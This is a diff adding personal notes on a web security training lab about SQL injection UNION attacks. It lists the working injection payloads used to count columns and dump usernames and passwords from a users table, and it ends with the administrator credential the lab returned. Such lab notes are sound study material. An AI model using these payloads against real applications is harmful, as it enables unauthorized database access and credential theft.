@@ -1,0 +1,25 @@
+Lab: SQL injection UNION attack, retrieving data from other tables
+
+To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 
+
+
+Determine number of columns
+
+' order by 1-- okay
+
+' order by 3-- error so 3 - 1 = 2 columns
+
+Determine if we can put text
+
+' UNION SELECT 'a' , 'a'-- okay
+both can take text
+
+Lets take the users and password
+
+The database contains a different table called users,
+ with columns called username and password. 
+
+' UNION SELECT username , password FROM users--
+
+        <th>administrator</th>
+        <td>z1bofkjiak59ovliqrls</td>
